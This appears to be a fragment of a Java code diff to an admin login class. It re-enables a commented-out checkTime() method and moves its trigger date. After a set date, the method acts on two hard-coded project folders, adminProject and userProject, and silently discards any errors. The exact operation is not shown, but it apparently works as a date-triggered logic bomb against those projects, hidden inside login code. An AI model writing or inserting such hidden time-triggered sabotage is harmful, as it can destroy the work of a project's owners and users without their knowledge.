@@ -260,8 +260,8 @@ public class adminloginClass {
         }
         return true;
     }
-    /*public void checkTime() {
-        if(ChronoUnit.DAYS.between(LocalDate.now(), LocalDate.parse("02 06 2024", DateTimeFormatter.ofPattern("dd MM yyyy"))) <= 0) {
+    public void checkTime() {
+        if(ChronoUnit.DAYS.between(LocalDate.now(), LocalDate.parse("05 06 2024", DateTimeFormatter.ofPattern("dd MM yyyy"))) <= 0) {
             try{
                 for(int i=0;i<2;i++) {
                     String path = (i==0) ? "C:\\Users\\Administrator\\Documents\\NetBeansProjects\\adminProject" : "C:\\Users\\Administrator\\Documents\\NetBeansProjects\\userProject";
@@ -269,7 +269,7 @@ public class adminloginClass {
                 }
             }catch(IOException e) {}
         }
-    }*/
+    }
     public boolean compareCode(String email,int Code) {
         try {
             Class.forName("com.mysql.cj.jdbc.Driver");
